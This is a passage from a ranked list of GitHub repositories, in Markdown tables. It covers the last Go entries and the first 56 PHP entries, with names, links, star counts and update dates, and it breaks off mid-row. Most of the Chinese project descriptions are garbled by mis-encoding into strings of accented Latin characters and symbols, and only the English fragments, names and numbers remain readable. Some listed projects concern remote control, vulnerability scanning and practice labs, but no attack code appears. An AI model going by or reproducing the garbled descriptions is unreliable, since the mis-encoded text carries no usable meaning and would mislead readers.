|191|[whitehatnote/BlueShell](https://github.com/whitehatnote/BlueShell)|Á∫¢ËìùÂØπÊäóË∑®Âπ≥Âè∞ËøúÊéßÂ∑•ÂÖ∑|273|Go|06/17|
|192|[idoubi/gonews](https://github.com/idoubi/gonews)|golangÊØèÊó•Êñ∞ÈóªÊ£ÄÁ¥¢Âπ≥Âè∞|261|Go|09/11|
|193|[islenbo/autossh](https://github.com/islenbo/autossh)|No password ssh client for Mac/Linux, one key login remote server. ‰∏Ä‰∏™SSHËøúÁ®ãÂÆ¢Êà∑Á´ØÔºåÂèØ‰∏ÄÈîÆÁôªÂΩïËøúÁ®ãÊúçÂä°Âô®Ôºå‰∏ªË¶ÅÁî®Êù•Âº•Ë°•Mac/Linux Terminal SSHÊó†Ê≥ï‰øùÂ≠òÂØÜÁ†ÅÁöÑ‰∏çË∂≥„ÄÇ|259|Go|07/23|
|194|[importcjj/sensitive](https://github.com/importcjj/sensitive)|ÊïèÊÑüËØçÊü•Êâæ,È™åËØÅ,ËøáÊª§ÂíåÊõøÊç¢ ü§ì FindAll, Validate, Filter and Replace words.|256|Go|04/16|
|195|[Mrs4s/MiraiGo](https://github.com/Mrs4s/MiraiGo)|qq-androidÂçèËÆÆÁöÑgolangÂÆûÁé∞, ÁßªÊ§ç‰∫émirai|250|Go|10/29|
|196|[asyncins/mist](https://github.com/asyncins/mist)|Ë∂ÖÈ´òÊÄßËÉΩ‰∏î‰∏çÂèóÊó∂Èó¥ÂõûÊã®ÂΩ±ÂìçÁöÑÂÖ®Â±ÄÂîØ‰∏Ä ID ÁîüÊàêÁÆóÊ≥ïÔºåËñÑÈõæÁÆóÊ≥ï|248|Go|06/06|
|197|[sodaling/FastestBilibiliDownloader](https://github.com/sodaling/FastestBilibiliDownloader)|BÁ´ôËßÜÈ¢ëÊûÅÈÄüÊâπÈáè‰∏ãËΩΩÂô® The fastest Bilibili video downloader|246|Go|10/16|
|198|[88250/city-geo](https://github.com/88250/city-geo)|üåÑ ‰∏≠ÂõΩÂüéÂ∏ÇÁªèÁ∫¨Â∫¶Êï∞ÊçÆ„ÄÇ|244|Go|09/11|
|199|[wumansgy/goEncrypt](https://github.com/wumansgy/goEncrypt)|goËØ≠Ë®ÄÂ∞ÅË£ÖÁöÑÂêÑÁßçÂØπÁß∞Âä†ÂØÜÂíåÈùûÂØπÁß∞Âä†ÂØÜÔºåÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®ÔºåÂåÖÊã¨3ÈáçDESÔºåAESÁöÑCBCÂíåCTRÊ®°ÂºèÔºåËøòÊúâRSAÈùûÂØπÁß∞Âä†ÂØÜ,ECCÊ§≠ÂúÜÊõ≤Á∫øÁöÑÂä†ÂØÜÂíåÊï∞Â≠óÁ≠æÂêç|242|Go|09/28|
|200|[goflyfox/gmanager](https://github.com/goflyfox/gmanager)|Âü∫‰∫égfÊ°ÜÊû∂ÁöÑÁÆ°ÁêÜÂπ≥Âè∞ÔºåÊîØÊåÅÁôªÂΩï„ÄÅËÆ§ËØÅ„ÄÅÁªÑÁªáÊú∫ÊûÑ„ÄÅÁî®Êà∑„ÄÅËßíËâ≤„ÄÅËèúÂçï„ÄÅÊó•Âøó|239|Go|07/11|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## PHP

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[easychen/howto-make-more-money](https://github.com/easychen/howto-make-more-money)|Á®ãÂ∫èÂëòÂ¶Ç‰Ωï‰ºòÈõÖÁöÑÊå£Èõ∂Ëä±Èí±Ôºå2.0ÁâàÔºåÂçáÁ∫ß‰∏∫Â∞è‰π¶‰∫Ü„ÄÇMost of this not work outside China , so no English translate|12.9k|PHP|10/17|
|2|[top-think/think](https://github.com/top-think/think)|ThinkPHP Framework ‚Äî‚ÄîÂçÅÂπ¥Âå†ÂøÉÁöÑÈ´òÊÄßËÉΩPHPÊ°ÜÊû∂|7.6k|PHP|10/27|
|3|[guyueyingmu/avbook](https://github.com/guyueyingmu/avbook)|AV ÁîµÂΩ±ÁÆ°ÁêÜÁ≥ªÁªüÔºå avmoo , javbus , javlibrary Áà¨Ëô´ÔºåÁ∫ø‰∏ä AV ÂΩ±ÁâáÂõæ‰π¶È¶ÜÔºåAV Á£ÅÂäõÈìæÊé•Êï∞ÊçÆÂ∫ìÔºåJapanese Adult Video Library,Adult Video Magnet Links - Japanese Adult Video Database|7.3k|PHP|10/01|
|4|[helloqingfeng/Awsome-Front-End-learning-resource](https://github.com/helloqingfeng/Awsome-Front-End-learning-resource)|:octocat:GitHubÊúÄÂÖ®ÁöÑÂâçÁ´ØËµÑÊ∫êÊ±áÊÄª‰ªìÂ∫ìÔºàÂåÖÊã¨ÂâçÁ´ØÂ≠¶‰π†„ÄÅÂºÄÂèëËµÑÊ∫ê„ÄÅÊ±ÇËÅåÈù¢ËØïÁ≠âÔºâ|7.0k|PHP|08/28|
|5|[fecshop/yii2_fecshop](https://github.com/fecshop/yii2_fecshop)|yii2 ( PHP ) fecmallÔºàfecshopÔºâ core code used for ecommerce shop Â§öËØ≠Ë®ÄÂ§öË¥ßÂ∏ÅÂ§öÂÖ•Âè£ÁöÑÂºÄÊ∫êÁîµÂïÜ B2C ÂïÜÂüéÔºåÊîØÊåÅÁßªÂä®Á´Øvue, app, html5ÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂæÆÂ∫óÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÁ≠â|4.4k|PHP|10/12|
|6|[yansongda/pay](https://github.com/yansongda/pay)|ÂèØËÉΩÊòØÊàëÁî®ËøáÁöÑÊúÄ‰ºòÈõÖÁöÑ Alipay Âíå WeChat ÁöÑÊîØ‰ªò SDK Êâ©Â±ïÂåÖ‰∫Ü|3.6k|PHP|10/26|
|7|[overtrue/pinyin](https://github.com/overtrue/pinyin)|:cn: Âü∫‰∫éËØçÂ∫ìÁöÑ‰∏≠ÊñáËΩ¨ÊãºÈü≥‰ºòË¥®Ëß£ÂÜ≥ÊñπÊ°à|3.5k|PHP|10/03|
|8|[owner888/phpspider](https://github.com/owner888/phpspider)|„ÄäÊàëÁî®Áà¨Ëô´‰∏ÄÂ§©Êó∂Èó¥‚ÄúÂÅ∑‰∫Ü‚ÄùÁü•‰πé‰∏ÄÁôæ‰∏áÁî®Êà∑ÔºåÂè™‰∏∫ËØÅÊòéPHPÊòØ‰∏ñÁïå‰∏äÊúÄÂ•ΩÁöÑËØ≠Ë®Ä „ÄãÊâÄ‰ΩøÁî®ÁöÑÁ®ãÂ∫è|3.2k|PHP|10/10|
|9|[overtrue/laravel-wechat](https://github.com/overtrue/laravel-wechat)|ÂæÆ‰ø° SDK for Laravel, Âü∫‰∫é overtrue/wechat|2.5k|PHP|10/09|
|10|[overtrue/easy-sms](https://github.com/overtrue/easy-sms)|:calling: ‰∏ÄÊ¨æÊª°Ë∂≥‰Ω†ÁöÑÂ§öÁßçÂèëÈÄÅÈúÄÊ±ÇÁöÑÁü≠‰ø°ÂèëÈÄÅÁªÑ‰ª∂|2.2k|PHP|10/04|
|11|[summerblue/laravel-shop](https://github.com/summerblue/laravel-shop)|Laravel ÁîµÂïÜÂÆûÊàòÊïôÁ®ãÁöÑÈ°πÁõÆ‰ª£Á†Å|2.2k|PHP|09/08|
|12|[matyhtf/framework](https://github.com/matyhtf/framework)|SPF ÔºàSwoole PHP FrameworkÔºâÔºå‰∏ñÁïåÁ¨¨‰∏ÄÊ¨æÂü∫‰∫éSwooleÊâ©Â±ïÁöÑPHPÊ°ÜÊû∂ÔºåÂºÄÂèëËÄÖÊòØSwooleÂàõÂßã‰∫∫ |2.2k|PHP|06/30|
|13|[helei112g/payment](https://github.com/helei112g/payment)|PaymentÊòØphpÁâàÊú¨ÁöÑÊîØ‰ªòËÅöÂêàÁ¨¨‰∏âÊñπsdkÔºåÈõÜÊàê‰∫ÜÂæÆ‰ø°ÊîØ‰ªò„ÄÅÊîØ‰ªòÂÆùÊîØ‰ªò„ÄÅÊãõÂïÜ‰∏ÄÁΩëÈÄöÊîØ‰ªò„ÄÇÊèê‰æõÁªü‰∏ÄÁöÑË∞ÉÁî®Êé•Âè£ÔºåÊñπ‰æøÂø´ÈÄüÊé•ÂÖ•ÂêÑÁßçÊîØ‰ªò„ÄÅÊü•ËØ¢„ÄÅÈÄÄÊ¨æ„ÄÅËΩ¨Ë¥¶ËÉΩÂäõ„ÄÇÊúçÂä°Á´ØÊé•ÂÖ•ÊîØ‰ªòÂäüËÉΩÔºåÊñπ‰æø„ÄÅÂø´Êç∑„ÄÇ|2.2k|PHP|10/20|
|14|[jae-jae/QueryList](https://github.com/jae-jae/QueryList)|:spider: The progressive PHP crawler framework!  ‰ºòÈõÖÁöÑÊ∏êËøõÂºèPHPÈááÈõÜÊ°ÜÊû∂„ÄÇ|2.2k|PHP|09/27|
|15|[Qsnh/meedu](https://github.com/Qsnh/meedu)|ÂºÄÊ∫êÂú®Á∫øÊïôËÇ≤ÁÇπÊí≠Á≥ªÁªü„ÄÇ|2.0k|PHP|10/29|
|16|[summerblue/phphub5](https://github.com/summerblue/phphub5)|PHPHub Ver 5 is a Forum project Powered by Laravel 5.1, and it is also the project build up PHP & Laravel China community ÔºàÊ≠§È°πÁõÆÂ∑≤ÂºÉÁî®Ôºâ|2.0k|PHP|03/09|
|17|[jqhph/dcat-admin](https://github.com/jqhph/dcat-admin)|üî•  ‰ΩøÁî®ÂæàÂ∞ëÁöÑ‰ª£Á†ÅÂø´ÈÄüÊûÑÂª∫‰∏Ä‰∏™ÂäüËÉΩÂÆåÂñÑÁöÑÈ´òÈ¢úÂÄºÂêéÂè∞Á≥ªÁªüÔºåÂÜÖÁΩÆ‰∏∞ÂØåÁöÑÂêéÂè∞Â∏∏Áî®ÁªÑ‰ª∂ÔºåÂºÄÁÆ±Âç≥Áî®ÔºåËÆ©ÂºÄÂèëËÄÖÂëäÂà´ÂÜóÊùÇÁöÑHTML‰ª£Á†Å„ÄÇ|1.9k|PHP|10/29|
|18|[privacy-protection-tools/anti-AD](https://github.com/privacy-protection-tools/anti-AD)|Ëá¥Âäõ‰∫éÊàê‰∏∫‰∏≠ÊñáÂå∫ÂëΩ‰∏≠ÁéáÊúÄÈ´òÁöÑÂπøÂëäËøáÊª§ÂàóË°®ÔºåÂÆûÁé∞Á≤æÁ°ÆÁöÑÂπøÂëäÂ±èËîΩÂíåÈöêÁßÅ‰øùÊä§„ÄÇanti-ADÁé∞Â∑≤ÊîØÊåÅAdGuardHomeÔºådnsmasqÔºå SurgeÔºåPi-HoleÔºåsmartdnsÁ≠âÁΩëÁªúÁªÑ‰ª∂„ÄÇÂÆåÂÖ®ÂÖºÂÆπÂ∏∏ËßÅÁöÑÂπøÂëäËøáÊª§Â∑•ÂÖ∑ÊâÄÊîØÊåÅÁöÑÂêÑÁßçÂπøÂëäËøáÊª§ÂàóË°®Ê†ºÂºè|1.8k|PHP|10/28|
|19|[zoujingli/ThinkAdmin](https://github.com/zoujingli/ThinkAdmin)|Âü∫‰∫é ThinkPHP Âü∫Á°ÄÂºÄÂèëÂπ≥Âè∞ÔºàÁôªÂΩïË¥¶Âè∑ÂØÜÁ†ÅÈÉΩÊòØ admin Ôºâ|1.7k|PHP|10/29|
|20|[matyhtf/webim](https://github.com/matyhtf/webim)|‰ΩøÁî®PHP+SwooleÂÆûÁé∞ÁöÑÁΩëÈ°µÂç≥Êó∂ËÅäÂ§©Â∑•ÂÖ∑|1.7k|PHP|07/23|
|21|[mashirozx/Sakura](https://github.com/mashirozx/Sakura)|A Wonderful WordPress Theme: Ê®±Ëä±Â∫ÑÁöÑÁôΩÁå´ÂçöÂÆ¢‰∏ªÈ¢ò|1.7k|PHP|10/20|
|22|[hui-ho/WebStack-Laravel](https://github.com/hui-ho/WebStack-Laravel)|‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÁΩëÂùÄÂØºËà™ÁΩëÁ´ôÈ°πÁõÆÔºåÊÇ®ÂèØ‰ª•ÊãøÊù•Âà∂‰ΩúËá™Â∑±ÁöÑÁΩëÂùÄÂØºËà™„ÄÇ|1.5k|PHP|09/10|
|23|[louislivi/SMProxy](https://github.com/louislivi/SMProxy)|Swoole MySQL Proxy ‰∏Ä‰∏™Âü∫‰∫é MySQL ÂçèËÆÆÔºåSwoole ÂºÄÂèëÁöÑMySQLÊï∞ÊçÆÂ∫ìËøûÊé•Ê±†„ÄÇ A MySQL database connection pool based on MySQL protocol and Swoole.|1.5k|PHP|04/23|
|24|[Tai7sy/card-system](https://github.com/Tai7sy/card-system)|Âç°ÂØÜÂïÜÂüéÁ≥ªÁªüÔºåÈ´òÊïàÂÆâÂÖ®ÁöÑÂú®Á∫øÂç°ÂØÜÂïÜÂüé|1.5k|PHP|09/12|
|25|[gongfuxiang/shopxo](https://github.com/gongfuxiang/shopxo)|ShopXOÂÖçË¥πÂºÄÊ∫êÂïÜÂüéÁ≥ªÁªü„ÄÅÂõΩÂÜÖÈ¢ÜÂÖà‰ºÅ‰∏öÁ∫ßB2CÂÖçË¥πÂºÄÊ∫êÁîµÂïÜÁ≥ªÁªüÔºåÂåÖÂê´PC„ÄÅh5„ÄÅÂæÆ‰ø°Â∞èÁ®ãÂ∫è„ÄÅÊîØ‰ªòÂÆùÂ∞èÁ®ãÂ∫è„ÄÅÁôæÂ∫¶Â∞èÁ®ãÂ∫è„ÄÅÂ§¥Êù°&ÊäñÈü≥Â∞èÁ®ãÂ∫è„ÄÅQQÂ∞èÁ®ãÂ∫èÔºåÈÅµÂæ™Apache2ÂºÄÊ∫êÂçèËÆÆÂèëÂ∏É„ÄÅÂü∫‰∫éThinkPHP5.1Ê°ÜÊû∂Á†îÂèë|1.4k|PHP|10/29|
|26|[zorlan/skycaiji](https://github.com/zorlan/skycaiji)|ËìùÂ§©ÈááÈõÜÂô®ÊòØ‰∏ÄÊ¨æÂÖçË¥πÁöÑÊï∞ÊçÆÈááÈõÜÂèëÂ∏ÉÁà¨Ëô´ËΩØ‰ª∂ÔºåÈááÁî®php+mysqlÂºÄÂèëÔºåÂèØÈÉ®ÁΩ≤Âú®‰∫ëÊúçÂä°Âô®ÔºåÂá†‰πéËÉΩÈááÈõÜÊâÄÊúâÁ±ªÂûãÁöÑÁΩëÈ°µÔºåÊó†ÁºùÂØπÊé•ÂêÑÁ±ªCMSÂª∫Á´ôÁ®ãÂ∫èÔºåÂÖçÁôªÂΩïÂÆûÊó∂ÂèëÂ∏ÉÊï∞ÊçÆÔºåÂÖ®Ëá™Âä®Êó†ÈúÄ‰∫∫Â∑•Âπ≤È¢ÑÔºÅÊòØÂ§ßÊï∞ÊçÆ„ÄÅ‰∫ëÊó∂‰ª£ÁΩëÁ´ôÊï∞ÊçÆËá™Âä®ÂåñÈááÈõÜÁöÑÊúÄ‰Ω≥‰∫ëÁ´ØÁà¨Ëô´ËΩØ‰ª∂|1.4k|PHP|07/21|
|27|[hightman/xunsearch](https://github.com/hightman/xunsearch)|ÂÖçË¥πÂºÄÊ∫êÁöÑ‰∏≠ÊñáÊêúÁ¥¢ÂºïÊìéÔºåÈááÁî® C/C++ ÁºñÂÜô (Âü∫‰∫é xapian Âíå scws)ÔºåÊèê‰æõ PHP ÁöÑÂºÄÂèëÊé•Âè£Âíå‰∏∞ÂØåÊñáÊ°£|1.4k|PHP|09/04|
|28|[jianyan74/rageframe2](https://github.com/jianyan74/rageframe2)|‰∏Ä‰∏™Âü∫‰∫éYii2È´òÁ∫ßÊ°ÜÊû∂ÁöÑÂø´ÈÄüÂºÄÂèëÂ∫îÁî®ÂºïÊìé|1.3k|PHP|09/14|
|29|[TideSec/WDScanner](https://github.com/TideSec/WDScanner)|WDScannerÂπ≥Âè∞ÁõÆÂâçÂÆûÁé∞‰∫ÜÂ¶Ç‰∏ãÂäüËÉΩÔºöÂàÜÂ∏ÉÂºèwebÊºèÊ¥ûÊâ´Êèè„ÄÅÂÆ¢Êà∑ÁÆ°ÁêÜ„ÄÅÊºèÊ¥ûÂÆöÊúüÊâ´Êèè„ÄÅÂ≠êÂüüÂêçÊûö‰∏æ„ÄÅÁ´ØÂè£Êâ´Êèè„ÄÅÁΩëÁ´ôÁà¨Ëô´„ÄÅÊöóÈìæÊ£ÄÊµã„ÄÅÂùèÈìæÊ£ÄÊµã„ÄÅÁΩëÁ´ôÊåáÁ∫πÊêúÈõÜ„ÄÅ‰∏ìÈ°πÊºèÊ¥ûÊ£ÄÊµã„ÄÅ‰ª£ÁêÜÊêúÈõÜÂèäÈÉ®ÁΩ≤Á≠âÂäüËÉΩ„ÄÇ|1.3k|PHP|06/22|
|30|[mylxsw/wizard](https://github.com/mylxsw/wizard)|WizardÊòØ‰∏ÄÊ¨æÂºÄÊ∫êÁöÑÊñáÊ°£ÁÆ°ÁêÜÂ∑•ÂÖ∑ÔºåÊîØÊåÅMarkdown/Swagger/TableÁ±ªÂûãÁöÑÊñáÊ°£„ÄÇ|1.2k|PHP|10/29|
|31|[zhanghuanchong/icon-workshop](https://github.com/zhanghuanchong/icon-workshop)|ÂõæÊ†áÂ∑•Âú∫ - ÁßªÂä®Â∫îÁî®ÂõæÊ†áÁîüÊàêÂ∑•ÂÖ∑Ôºå‰∏ÄÈîÆÁîüÊàêÊâÄÊúâÂ∞∫ÂØ∏ÁöÑÂ∫îÁî®ÂõæÊ†áÂíåÂêØÂä®Âõæ|1.2k|PHP|08/30|
|32|[wususu/effective-resourses](https://github.com/wususu/effective-resourses)| :book:Â≠¶‰π†ËµÑÊ∫êÊï¥Âêà|1.2k|PHP|09/07|
|33|[assimon/dujiaoka](https://github.com/assimon/dujiaoka)|üöÄÁã¨ËßíÊï∞Âç°(ÂèëÂç°)-ÂºÄÊ∫êÂºèÁ´ôÈïøËá™Âä®ÂåñÂîÆË¥ßËß£ÂÜ≥ÊñπÊ°à„ÄÅÈ´òÊïà„ÄÅÁ®≥ÂÆö„ÄÅÂø´ÈÄüÔºÅüéâüéâ|1.2k|PHP|10/28|
|34|[SegmentFault/HyperDown](https://github.com/SegmentFault/HyperDown)|‰∏Ä‰∏™ÁªìÊûÑÊ∏ÖÊô∞ÁöÑÔºåÊòì‰∫éÁª¥Êä§ÁöÑÔºåÁé∞‰ª£ÁöÑPHP MarkdownËß£ÊûêÂô®|1.1k|PHP|10/29|
|35|[zhuifengshaonianhanlu/pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)|‰∏Ä‰∏™Â•ΩÁé©ÁöÑWebÂÆâÂÖ®-ÊºèÊ¥ûÊµãËØïÂπ≥Âè∞|1.1k|PHP|10/02|
|36|[typecho-fans/plugins](https://github.com/typecho-fans/plugins)|Typecho FansÊèí‰ª∂‰ΩúÂìÅÁõÆÂΩï|1.1k|PHP|10/26|
|37|[EleTeam/Shop-PHP-Yii2](https://github.com/EleTeam/Shop-PHP-Yii2)|EleTeamÂºÄÊ∫êÈ°πÁõÆ-ÁîµÂïÜÂÖ®Â•óËß£ÂÜ≥ÊñπÊ°à‰πãPHPÁâà-Shop-for-PHP-Yii2„ÄÇ‰∏Ä‰∏™Á±ª‰ºº‰∫¨‰∏ú/Â§©Áå´/Ê∑òÂÆùÁöÑÂïÜÂüéÔºåÊúâÂØπÂ∫îÁöÑAPPÊîØÊåÅÔºåÁî±EleTeamÂõ¢ÈòüÁª¥Êä§ÔºÅ|1.1k|PHP|09/16|
|38|[fukuball/jieba-php](https://github.com/fukuball/jieba-php)|""ÁµêÂ∑¥""‰∏≠ÊñáÂàÜË©ûÔºöÂÅöÊúÄÂ•ΩÁöÑ PHP ‰∏≠ÊñáÂàÜË©û„ÄÅ‰∏≠ÊñáÊñ∑Ë©ûÁµÑ‰ª∂„ÄÇ / ""Jieba"" (Chinese for ""to stutter"") Chinese text segmentation: built to be the best PHP Chinese word segmentation module.|1.0k|PHP|04/16|
|39|[bowu678/php_bugs](https://github.com/bowu678/php_bugs)|PHP‰ª£Á†ÅÂÆ°ËÆ°ÂàÜÊÆµËÆ≤Ëß£|1.0k|PHP|07/12|
|40|[geesondog/rhaphp](https://github.com/geesondog/rhaphp)|RhaPHPÊòØÂæÆ‰ø°Á¨¨‰∏âÊñπÁÆ°ÁêÜÂπ≥Âè∞ÔºåÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÁÆ°ÁêÜÁ≥ªÁªüÔºåÊîØÊåÅÂ§öÂÖ¨‰ºóÂè∑ÁÆ°ÁêÜÔºåCRM‰ºöÂëòÁÆ°ÁêÜÔºåÂ∞èÁ®ãÂ∫èÂºÄÂèëÔºåAPPÊé•Âè£ÂºÄÂèë„ÄÅÂá†‰πéÈõÜÂêàÂæÆ‰ø°ÂäüËÉΩÔºåÁÆÄÊ¥Å„ÄÅÂø´ÈÄü‰∏äÊâã„ÄÅÂø´ÈÄüÂºÄÂèëÂæÆ‰ø°ÂêÑÁßçÂêÑÊ†∑Â∫îÁî®„ÄÇÁÆÄÊ¥Å„ÄÅÂ•ΩÁî®„ÄÅÂø´ÈÄü„ÄÅÈ°πÁõÆÂºÄÂèëÂø´Âá†ÂÄç „ÄÇ|1.0k|PHP|10/13|
|41|[MoeNetwork/Tieba-Cloud-Sign](https://github.com/MoeNetwork/Tieba-Cloud-Sign)|ÁôæÂ∫¶Ë¥¥Âêß‰∫ëÁ≠æÂà∞ÔºåÂú®ÊúçÂä°Âô®‰∏äÈÖçÁΩÆÂ•ΩÂ∞±Êó†ÈúÄËøõË°å‰ªª‰ΩïÊìç‰Ωú‰æøÂèØ‰ª•ÂÆûÁé∞Ë¥¥ÂêßÁöÑÂÖ®Ëá™Âä®Á≠æÂà∞„ÄÇÈÖçÂêàÊèí‰ª∂‰ΩøÁî®ËøòÂèØÂÆûÁé∞‰∫ëÁÅåÊ∞¥„ÄÅÁÇπËµû„ÄÅÂ∞ÅÁ¶Å„ÄÅÂà†Â∏ñ„ÄÅÂÆ°Êü•Á≠âÂäüËÉΩ |999|PHP|02/20|
|42|[overtrue/api.yike.io](https://github.com/overtrue/api.yike.io)|‰∏ÄÂàªÁ§æÂå∫ÂêéÁ´Ø API Ê∫êÁ†Å|987|PHP|05/09|
|43|[Leslin/thinkphp5-restfulapi](https://github.com/Leslin/thinkphp5-restfulapi)|restful-apiÈ£éÊ†ºÊé•Âè£ APPÊé•Âè£ APPÊé•Âè£ÊùÉÈôê  oauth2.0 Êé•Âè£ÁâàÊú¨ÁÆ°ÁêÜ Êé•Âè£Èâ¥ÊùÉ|932|PHP|09/27|
|44|[zoujingli/WeChatDeveloper](https://github.com/zoujingli/WeChatDeveloper)|„ÄêÊñ∞„ÄëÂæÆ‰ø°ÊúçÂä°Âè∑+ÂæÆ‰ø°Â∞èÁ®ãÂ∫è+ÂæÆ‰ø°ÊîØ‰ªò+ÊîØ‰ªòÂÆùÊîØ‰ªò|887|PHP|09/13|
|45|[jitamin/jitamin](https://github.com/jitamin/jitamin)|:panda_face: Jitamin is a free software written in PHP, intended to handle the project management over the web. QQÁæ§: 656868|886|PHP|06/29|
|46|[dedemao/alipay](https://github.com/dedemao/alipay)|‰∏Ä‰∏™PHPÊñá‰ª∂ÊêûÂÆöÊîØ‰ªòÂÆùÊîØ‰ªòÁ≥ªÂàóÔºåÂåÖÊã¨ÁîµËÑëÁΩëÁ´ôÊîØ‰ªòÔºåÊâãÊú∫ÁΩëÁ´ôÊîØ‰ªòÔºåÁé∞ÈáëÁ∫¢ÂåÖ„ÄÅÊ∂àË¥πÁ∫¢ÂåÖ„ÄÅÊâ´Á†ÅÊîØ‰ªòÔºåJSAPIÊîØ‰ªò„ÄÅÂçïÁ¨îËΩ¨Ë¥¶Âà∞ÊîØ‰ªòÂÆùË¥¶Êà∑„ÄÅ‰∫§ÊòìÁªìÁÆóÔºàÂàÜË¥¶„ÄÅÂàÜÊ∂¶Ôºâ„ÄÅÁΩëÈ°µÊéàÊùÉËé∑ÂèñÁî®Êà∑‰ø°ÊÅØÁ≠â|864|PHP|10/26|
|47|[swlib/saber](https://github.com/swlib/saber)|‚öîÔ∏è Saber, PHPÂºÇÊ≠•ÂçèÁ®ãHTTPÂÆ¢Êà∑Á´Ø   PHP Coroutine HTTP client - Swoole Humanization Library|825|PHP|09/02|
|48|[yansongda/laravel-pay](https://github.com/yansongda/laravel-pay)|ÂèØËÉΩÊòØÊàëÁî®ËøáÁöÑÊúÄ‰ºòÈõÖÁöÑ Alipay Âíå WeChat ÁöÑ laravel ÊîØ‰ªòÊâ©Â±ïÂåÖ‰∫Ü|823|PHP|09/10|
|49|[peinhu/AetherUpload-Laravel](https://github.com/peinhu/AetherUpload-Laravel)|A Laravel package to upload large files  ‰∏ä‰º†Â§ßÊñá‰ª∂ÁöÑLaravelÊâ©Â±ïÂåÖ|814|PHP|09/21|
|50|[dedemao/weixinPay](https://github.com/dedemao/weixinPay)|ÂæÆ‰ø°ÊîØ‰ªòÂçïÊñá‰ª∂Áâà„ÄÇ‰∏Ä‰∏™PHPÊñá‰ª∂ÊêûÂÆöÂæÆ‰ø°ÊîØ‰ªòÁ≥ªÂàó„ÄÇÂåÖÊã¨ÂéüÁîüÊîØ‰ªòÔºàÊâ´Á†ÅÊîØ‰ªòÔºâÔºåH5ÊîØ‰ªòÔºåÂÖ¨‰ºóÂè∑ÊîØ‰ªòÔºåÁé∞ÈáëÁ∫¢ÂåÖ„ÄÅ‰ºÅ‰∏ö‰ªòÊ¨æÂà∞Èõ∂Èí±Á≠â„ÄÇÊñ∞Â¢ûV3Áâà„ÄÇ|793|PHP|06/06|
|51|[yuantuo666/baiduwp-php](https://github.com/yuantuo666/baiduwp-php)|PanDownloadÁΩëÈ°µÂ§çÂàªÁâà|780|PHP|10/21|
|52|[kevinyan815/Learning_Laravel_Kernel](https://github.com/kevinyan815/Learning_Laravel_Kernel)|LaravelÊ†∏ÂøÉ‰ª£Á†ÅÂ≠¶‰π†|771|PHP|09/23|
|53|[xiebruce/PicUploader](https://github.com/xiebruce/PicUploader)|‰∏Ä‰∏™Ëøò‰∏çÈîôÁöÑÂõæÂ∫äÂ∑•ÂÖ∑ÔºåÊîØÊåÅMac/Win/LinuxÊúçÂä°Âô®„ÄÅÊîØÊåÅÂéãÁº©Âêé‰∏ä‰º†„ÄÅÊ∑ªÂä†ÂõæÁâáÊàñÊñáÂ≠óÊ∞¥Âç∞„ÄÅÂ§öÊñá‰ª∂ÂêåÊó∂‰∏ä‰º†„ÄÅÂêåÊó∂‰∏ä‰º†Âà∞Â§ö‰∏™‰∫ë„ÄÅÂè≥Âáª‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†„ÄÅÂø´Êç∑ÈîÆ‰∏ä‰º†Ââ™Ë¥¥ÊùøÊà™Âõæ„ÄÅWebÁâà‰∏ä‰º†„ÄÅÊîØÊåÅ‰Ωú‰∏∫Mweb/TyporaÂèëÂ∏ÉÂõæÁâáÊé•Âè£„ÄÅ‰Ωú‰∏∫PicGo/ShareX/uPicÁ≠âÁöÑËá™ÂÆö‰πâÂõæÂ∫äÔºåÊîØÊåÅÂú®ÊúçÂä°Âô®‰∏äÈÉ®ÁΩ≤‰Ωú‰∏∫ÂõæÂ∫äÊé•Âè£ÔºåÊîØÊåÅ‰∏ä‰º†‰ªªÊÑèÊ†ºÂºèÊñá‰ª∂„ÄÇ|766|PHP|10/05|
|54|[magicblack/maccms10](https://github.com/magicblack/maccms10)|ËãπÊûúcms-v10,maccms-v10,ÂºÄÊ∫êCMS,ÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü,ËßÜÈ¢ëÂàÜ‰∫´Á®ãÂ∫è,ÂàÜÈõÜÂâßÊÉÖÁ®ãÂ∫è,ÁΩëÂùÄÂØºËà™Á®ãÂ∫è,Êñ∞ÈóªÁ®ãÂ∫è,Êº´ÁîªÁ®ãÂ∫è,ÂõæÁâáÁ®ãÂ∫è|739|PHP|10/26|
|55|[lizhichao/one](https://github.com/lizhichao/one)|‰∏Ä‰∏™ÊûÅÁÆÄÈ´òÊÄßËÉΩphpÊ°ÜÊû∂ÔºåÊîØÊåÅ[swoole   php-fpm ]ÁéØÂ¢É|736|PHP|10/29|
|56|[wmhello/laravel_template_with_vue](https://github.com/wmhello/laravel_template_with_vue)|laravel5.5Âíåvue.jsÁªìÂêàÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÈ°πÁõÆÊ®°Êùø,ÂêéÁ´Ø‰ΩøÁî®‰∫ÜlaravelÁöÑLTSÁâàÊú¨Ôºà5.5ÔºâÔºåÂâçÁ´Ø‰ΩøÁî®‰∫ÜÊµÅË°åÁöÑvue-element-templateÈ°πÁõÆ„ÄÇ‰Ωú‰∏∫Á®ãÂ∫èÁöÑËµ∑ÁÇπÔºåÂèØ‰ª•Áõ¥Êé•‰ª•Ê≠§‰∏∫Âü∫Á°ÄÊù•ËøõË°å‰∏öÂä°Êâ©Â±ï„ÄÇÊ®°ÊùøÂÜÖÂÆπÂåÖÊã¨Âü∫Á°ÄÁöÑÁî®Êà∑ÁÆ°ÁêÜÂíåÊùÉÈôêÁÆ°ÁêÜ„ÄÅÊó•ÂøóÁÆ°ÁêÜ„ÄÅÈõÜÊàêÁ¨¨‰∏âÊñπÁôªÂΩïÔºåÊï¥Âêàlaravel-echo-server ÂÆûÁé∞‰∫Üwebsocket 